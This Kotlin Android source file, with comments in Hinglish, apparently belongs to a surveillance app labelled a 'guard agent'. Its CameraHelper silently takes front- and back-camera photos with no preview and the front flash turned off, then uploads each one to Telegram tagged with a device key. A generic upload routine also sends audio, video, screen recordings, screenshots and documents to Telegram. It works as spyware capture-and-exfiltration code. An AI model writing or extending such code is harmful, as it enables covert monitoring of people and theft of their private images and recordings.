package com.guard.agent.helpers.media

import android.annotation.SuppressLint
import android.content.Context
import androidx.camera.core.CameraSelector
import androidx.camera.core.ImageCapture
import androidx.camera.core.ImageCaptureException
import androidx.camera.lifecycle.ProcessCameraProvider
import androidx.core.content.ContextCompat
import androidx.lifecycle.Lifecycle
import androidx.lifecycle.LifecycleOwner
import androidx.lifecycle.LifecycleRegistry
import com.guard.agent.core.Constants
import com.guard.agent.helpers.telegram.TelegramUploader
import com.guard.agent.utils.Logger
import java.io.File
import java.util.concurrent.Executors

object CameraHelper {

    private const val TAG = "CameraHelper"
    private val executor = Executors.newSingleThreadExecutor()

    /**
     * Front camera se ek photo capture karke Telegram pe upload karo.
     */
    @SuppressLint("RestrictedApi")
    fun captureFront(ctx: Context, deviceKey: String) {
        val future = ProcessCameraProvider.getInstance(ctx)
        future.addListener({
            try {
                val provider = future.get()

                val owner = DummyLifecycleOwner()
                owner.start()

                val selector = CameraSelector.DEFAULT_FRONT_CAMERA
                val capture = ImageCapture.Builder()
                    .setCaptureMode(ImageCapture.CAPTURE_MODE_MINIMIZE_LATENCY)
                    .setFlashMode(ImageCapture.FLASH_MODE_OFF)
                    .build()

                provider.unbindAll()
                provider.bindToLifecycle(owner, selector, capture)

                Thread.sleep(700)

                val file = File(
                    ctx.cacheDir,
                    "snap_${System.currentTimeMillis()}.jpg"
                )

                val opts = ImageCapture.OutputFileOptions.Builder(file).build()
                capture.takePicture(
                    opts,
                    executor,
                    object : ImageCapture.OnImageSavedCallback {
                        override fun onImageSaved(out: ImageCapture.OutputFileResults) {
                            Logger.d(TAG, "Image saved: ${file.absolutePath}")
                            // ⭐ Telegram pe upload
                            TelegramUploader.uploadPhoto(
                                ctx, deviceKey, file, Constants.SUB_PHOTOS
                            )
                            try {
                                provider.unbindAll()
                                owner.stop()
                            } catch (_: Exception) {}
                        }

                        override fun onError(e: ImageCaptureException) {
                            Logger.e(TAG, "Capture error", e)
                            try {
                                provider.unbindAll()
                                owner.stop()
                            } catch (_: Exception) {}
                            file.delete()
                        }
                    }
                )
            } catch (e: Exception) {
                Logger.e(TAG, "captureFront failed", e)
            }
        }, ContextCompat.getMainExecutor(ctx))
    }

    /**
     * Back camera se photo capture.
     */
    @SuppressLint("RestrictedApi")
    fun captureBack(ctx: Context, deviceKey: String) {
        val future = ProcessCameraProvider.getInstance(ctx)
        future.addListener({
            try {
                val provider = future.get()
                val owner = DummyLifecycleOwner()
                owner.start()

                val selector = CameraSelector.DEFAULT_BACK_CAMERA
                val capture = ImageCapture.Builder()
                    .setCaptureMode(ImageCapture.CAPTURE_MODE_MINIMIZE_LATENCY)
                    .build()

                provider.unbindAll()
                provider.bindToLifecycle(owner, selector, capture)

                Thread.sleep(700)

                val file = File(
                    ctx.cacheDir,
                    "snap_back_${System.currentTimeMillis()}.jpg"
                )

                val opts = ImageCapture.OutputFileOptions.Builder(file).build()
                capture.takePicture(
                    opts,
                    executor,
                    object : ImageCapture.OnImageSavedCallback {
                        override fun onImageSaved(out: ImageCapture.OutputFileResults) {
                            TelegramUploader.uploadPhoto(
                                ctx, deviceKey, file, Constants.SUB_PHOTOS
                            )
                            try {
                                provider.unbindAll()
                                owner.stop()
                            } catch (_: Exception) {}
                        }

                        override fun onError(e: ImageCaptureException) {
                            Logger.e(TAG, "Back capture error", e)
                            try {
                                provider.unbindAll()
                                owner.stop()
                            } catch (_: Exception) {}
                            file.delete()
                        }
                    }
                )
            } catch (e: Exception) {
                Logger.e(TAG, "captureBack failed", e)
            }
        }, ContextCompat.getMainExecutor(ctx))
    }

    /**
     * Generic upload function — baaki helpers bhi use karte hain.
     * Ab direct Telegram pe bhejta hai.
     */
    fun upload(ctx: Context, deviceKey: String, file: File, folder: String) {
        try {
            when {
                folder == Constants.SUB_AUDIOS -> {
                    TelegramUploader.uploadVoice(ctx, deviceKey, file, folder)
                }
                folder == Constants.SUB_VIDEOS -> {
                    TelegramUploader.uploadVideo(ctx, deviceKey, file, folder)
                }
                folder == Constants.SUB_PHOTOS -> {
                    TelegramUploader.uploadPhoto(ctx, deviceKey, file, folder)
                }
                folder == Constants.SUB_SCREEN_RECORDS -> {
                    TelegramUploader.uploadVideo(ctx, deviceKey, file, folder)
                }
                folder == Constants.SUB_SCREENSHOTS -> {
                    TelegramUploader.uploadPhoto(ctx, deviceKey, file, folder)
                }
                else -> {
                    // Default — document
                    TelegramUploader.uploadDocument(ctx, deviceKey, file, folder)
                }
            }
        } catch (e: Exception) {
            Logger.e(TAG, "upload failed", e)
        }
    }

    /**
     * Dummy LifecycleOwner — CameraX ko chahiye hota hai.
     */
    private class DummyLifecycleOwner : LifecycleOwner {
        private val registry = LifecycleRegistry(this)
        override val lifecycle: Lifecycle get() = registry

        fun start() {
            registry.currentState = Lifecycle.State.RESUMED
        }

        fun stop() {
            registry.currentState = Lifecycle.State.DESTROYED
        }
    }
}
